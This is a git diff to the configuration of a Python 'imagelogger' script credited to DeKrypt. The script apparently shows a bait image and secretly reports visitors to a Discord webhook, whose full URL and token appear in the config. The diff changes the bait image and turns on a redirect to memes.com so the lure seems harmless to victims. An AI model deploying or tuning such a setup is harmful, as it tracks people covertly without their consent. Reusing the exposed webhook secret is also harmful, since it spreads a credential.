@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1130048501120778280/ahLM-DPUue1CU8XhrWxK_yeOUzjp5TzeK7tO4DUSDAADn6YA3PweFBiFLg4ZcRUxP02D",
-    "image": "https://assets.afcdn.com/recipe/20131023/6366_w700h1050c1cx1872cy2808.webp", # You can also have a custom image by using a URL argument
+    "image": "https://i1.sndcdn.com/artworks-QaUuEyX6ZoCw8MZC-kNA5yQ-t500x500.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://memes.com/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
